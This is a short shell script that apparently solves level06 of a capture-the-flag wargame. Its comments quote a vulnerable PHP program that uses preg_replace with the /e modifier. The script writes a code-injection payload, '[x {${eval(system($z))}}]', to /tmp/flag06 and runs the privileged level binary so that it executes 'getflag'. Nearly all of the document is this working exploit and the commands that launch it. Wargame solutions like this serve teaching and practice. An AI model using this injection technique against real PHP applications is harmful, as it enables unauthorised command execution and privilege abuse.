#!/bin/sh

# home/level06 runs level06.php:
# <?php
# function y($m)
# {
# 	$m = preg_replace("/\./", " x ", $m);
# 	$m = preg_replace("/@/", " y", $m);
# 	return $m;
# }
# 
# function x($y, $z)
# {
# 	$a = file_get_contents($y);
# 	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); --EXPLOIT--
# 	$a = preg_replace("/\[/", "(", $a);
# 	$a = preg_replace("/\]/", ")", $a);
# 	return $a;
# }
# 
# $r = x($argv[1], $argv[2]);
# print $r;
# ?>

# regex '//e' pattern runs eval on match
# pattern to match : '[x *]' -> eval runs *
# argv[1] = [x {${eval(system($z))}}]
# argv[2] = getflag

echo "[x {\${eval(system(\$z))}}]" > /tmp/flag06;
/home/user/level06/level06 /tmp/flag06 getflag

